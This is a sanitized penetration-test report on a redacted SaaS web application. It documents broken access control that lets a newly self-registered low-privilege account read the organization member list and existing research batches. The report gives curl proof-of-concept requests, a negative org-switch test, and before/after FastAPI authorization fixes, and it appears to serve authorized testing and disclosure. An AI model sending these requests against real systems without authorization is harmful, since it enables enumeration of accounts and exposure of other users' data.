---
title: "Broken Access Control / Improper Resource Isolation"
date: "2026-08-20"
poc_num: "01"
kicker: "PENETRATION TEST FINDINGS REPORT - Authorized Testing"
capture: "poc-01.pcap"
capture_note: "low-privilege account reads restricted org resources"
intro: "A newly registered account with the SDR (Sales Development Representative) role can access organization information and resources that should not be exposed to a new low-privilege user."
severity: "Medium"
cwe: "CWE-862 - Missing Authorization"
cwe_secondary: "CWE-200 - Exposure of Sensitive Information"
owasp: "A01:2021 - Broken Access Control"
target: "[REDACTED] - SaaS web application"
test_date: "2026-08-20"
status: "CONFIRMED"
tester: "Rudi - Offensive Security"
sev_note: "Severity is researcher-assessed based on observed conditions, not a vendor rating."
authz_label: "Authorization & disclosure."
authz: "Testing was performed under authorization, scope-strict and non-destructive. All requests were read-only except the creation of one PoC account. No production data was touched - identifiers used were fake/PoC values. Host, product name, and any personal data are redacted for public release. This is a sanitized showcase, not the confidential deliverable."
---

## Summary {#summary}

A newly registered account with the **SDR** (Sales Development Representative) role can access organization information and resources that should not be exposed to a new low-privilege user.

The endpoint `GET /api/v1/orgs/me/members` returns the full list of organization members and their roles to the new account. Separately, `GET /api/v1/research/discover/batches` returns existing research batches to a PoC account that has never performed any discovery activity.

Backend fingerprint: FastAPI (Python) + SQLAlchemy + Uvicorn - inferred from the Pydantic error schema. The org-switch IDOR (`POST /api/v1/orgs/switch`) returned 403 and is **not** vulnerable (see PoC 4).

## Risk Map {#riskmap}

| ID | Severity | Class | Evidence | CWE | Fix Status |
|---|---|---|---|---|---|
| F-01 | Medium | Broken Access Control - Member List | `GET /orgs/me/members` → 200 (new SDR account) | CWE-862 / CWE-200 | Not claimed |
| F-02 | Medium | Broken Access Control - Research Batches | `GET /research/discover/batches` → 200 (unused account) | CWE-862 / CWE-200 | Not claimed |

## Authorization Status & Scope {#scope}

| | |
|---|---|
| **Authorization status** | Authorized testing - scope-strict, non-destructive |
| **Discovery method** | Public registration + authenticated API requests |
| **Authentication bypassed** | NO - legitimately registered low-privilege account |
| **Automated scanning** | NOT performed - manual requests only |
| **Testing environment** | Production, read-only (except one PoC account creation) |
| **Production data accessed** | NO - PoC/fake identifiers only |
| **Data modified or destroyed** | NO |
| **Target identified here** | NO |

## Preconditions {#pre}

- New account with the SDR role registered through the public registration endpoint.
- JWT obtained directly from the registration response - no email verification or admin approval required.
- Testing performed without touching real production data; identifiers were fake/PoC values.
- All requests read-only except PoC 1 (new account registration).

## PoC 1 - Self-registration creates an active account + JWT {#poc1}

*Objective:* show that public registration creates an active account and returns an auth token with no further verification or approval.

```bash {label="bash"}
$ TARGET="https://TARGET"
$ EMAIL="poc_$(date +%s)@example.test"
$ curl -i -X POST "$TARGET/api/v1/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"'"$EMAIL"'","name":"PoC Test","password":"[REDACTED]"}'
HTTP/1.1 200 OK

{ "access_token": "eyJ...", ... }
```

Public registration produces an authenticated session directly. The JWT is issued without email verification or admin approval.

*Note:* this is not itself a vulnerability absent a requirement prohibiting self-registration - but it is the precondition for PoC 2 and PoC 3.

![PoC login page, account redacted](/images/img-poc/poc01/poc01.jpg "Figure 1 - login page with the PoC account redacted.")

## PoC 2 - New user can view the member list {#poc2}

*Objective:* show that a newly registered SDR account can read the organization member list and roles.

```bash {label="bash"}
$ curl -i "$TARGET/api/v1/orgs/me/members" \
    -H "Authorization: Bearer <JW...>"
HTTP/1.1 200 OK

[ { "email": "...", "role": "..." },
  { "email": "...", "role": "owner" } ]
```

A new SDR account with no activity history can view the complete member list and their roles, including accounts with the **owner** role. This is unauthorized visibility into organization information.

![PoC account dashboard after login](/images/img-poc/poc01/poc02.jpg "Figure 2 - PoC account dashboard after successful login.")

## PoC 3 - New user can view existing research batches {#poc3}

*Objective:* show that a new SDR account with no discovery activity can read research batches already in the system.

```bash {label="bash"}
$ curl -i "$TARGET/api/v1/research/discover/batches?limit=10" \
    -H "Authorization: Bearer <JW...>"
{ "batches": [ { "id": ..., "status": "completed",
   "total": 30, "prospects_count": 30,
   "created_at": "2026-08-.." } ] }
```

The new account with no prior discovery activity receives a response containing an existing, completed batch (prospects_count: 30) - unauthorized visibility into existing resources.

*Note:* not claimed as a cross-tenant IDOR - ownership/tenant boundaries were not definitively established in this test.

## PoC 4 - Org switching (negative test / not vulnerable) {#poc4}

*Objective:* prevent overclaiming by including a negative test for the org-switch IDOR.

```bash {label="bash"}
$ curl -i -X POST "$TARGET/api/v1/orgs/switch" \
    -H "Authorization: Bearer <JW...>" \
    -H "Content-Type: application/json" \
    -d '{"organization_id":1}'
HTTP/1.1 403 Forbidden

{"detail": "Not a member of the target organization"}
```

**Conclusion:** org-switch IDOR is NOT vulnerable. The server correctly returns 403 with an appropriate message.

## Impact {#impact}

> IMPACT:: Impact
>
> **A. Member-list disclosure.** A new SDR account can read the full member list and roles, including owner accounts - usable for account enumeration, social engineering, or targeted attacks on higher-privilege accounts.
>
> **B. Unauthorized resource visibility.** A new account with no activity can view existing research batches, including status and prospect count - potentially exposing commercial data that should be isolated.

> NOTCLAIMED:: Findings not claimed
>
> - Credentials exposure - not proven.
> - Invitation takeover - not proven.
> - Cross-tenant IDOR - not proven (ownership boundaries not confirmed).
> - Prospect PII exposure - not proven.

## Severity Assessment {#cvss}

Severity is researcher-assessed based on the observed conditions: the flaw is network-accessible with no complex preconditions, but requires a registered low-privilege account. Impact is limited to disclosure of the member list and resource metadata, with no evidence of data modification or availability impact.

## Root Cause {#rootcause}

No adequate authorization check on `/api/v1/orgs/me/members` and `/api/v1/research/discover/batches`. Both endpoints validate only that the request carries a valid token (**authentication**) but never validate whether the caller is authorized to access the returned resource (**authorization**).

## Solution & Recommendations {#fix}

### before - vulnerable pattern

```python {label="python"}
# VULNERABLE: returns all members without an org filter
def get_org_members(db, current_user):
    return db.query(Member).all()
```

### after - secure pattern

```python {label="python"}
def get_org_members(db, current_user):
    caller_org_id = current_user.organization_id
    membership = db.query(Membership).filter(
        Membership.user_id == current_user.id,
        Membership.org_id  == caller_org_id,
    ).first()
    if not membership:
        raise HTTPException(status_code=403, detail="Forbidden")
    return db.query(Member).filter(
        Member.org_id == caller_org_id
    ).all()
```

### authorization for /orgs/me/members (FastAPI)

```python {label="python"}
@router.get('/orgs/me/members')
def list_org_members(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    if not current_user.active_org_id:
        raise HTTPException(status_code=403, detail='No active organization')
    membership = db.query(Membership).filter(
        Membership.user_id == current_user.id,
        Membership.org_id  == current_user.active_org_id,
        Membership.is_active == True,
    ).first()
    if not membership:
        raise HTTPException(status_code=403, detail='Not a member of this organization')
    return db.query(Member).filter(
        Member.org_id == current_user.active_org_id
    ).all()
```

### authorization for /research/discover/batches

```python {label="python"}
@router.get('/research/discover/batches')
def get_batches(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
    limit: int = Query(default=10, le=100),
):
    # Option A: strict - only batches owned by the caller
    batches = db.query(Batch).filter(
        Batch.created_by == current_user.id
    ).order_by(Batch.created_at.desc()).limit(limit).all()
    # Option B: org-scoped - if batches are shared within the org
    # batches = db.query(Batch).filter(
    #     Batch.org_id == current_user.active_org_id
    # ).order_by(Batch.created_at.desc()).limit(limit).all()
    return {'batches': batches}
```

> FIX:: Least-privilege matrix
>
> | Endpoint | Owner | Manager | SDR |
> |---|---|---|---|
> | GET /orgs/me/members | Yes (all) | Yes (all) | Yes (self) |
> | GET /research/.../batches | Yes (all) | Yes (team) | Yes (self-owned) |
> | POST /orgs/switch | Yes | No | No |
> | GET /orgs/me/prospects | Yes | Yes (team) | Yes (assigned only) |

### remediation priority

| # | Remediation | Priority |
|---|---|---|
| 1 | Authorization filter for /orgs/me/members | HIGH |
| 2 | Authorization filter for /research/.../batches | HIGH |
| 3 | Implement RBAC permission matrix for SDR | HIGH |
| 4 | Audit logging for sensitive endpoints | MEDIUM |
| 5 | Regression / automated security test | MEDIUM |
| 6 | Review other endpoints with similar patterns | MEDIUM |

## Conclusion {#conclusion}

A new SDR account can read information that should not be exposed: the organization member list (PoC 2) and existing research batches (PoC 3). Both endpoints perform an authentication check but lack an adequate authorization check. The org-switch IDOR was not proven - the endpoint correctly returns 403 - and is excluded as a finding. All testing was read-only, with no brute force, no data changes, and no access to production accounts or data.

## References {#refs}

- [CWE-284 - Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-285 - Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)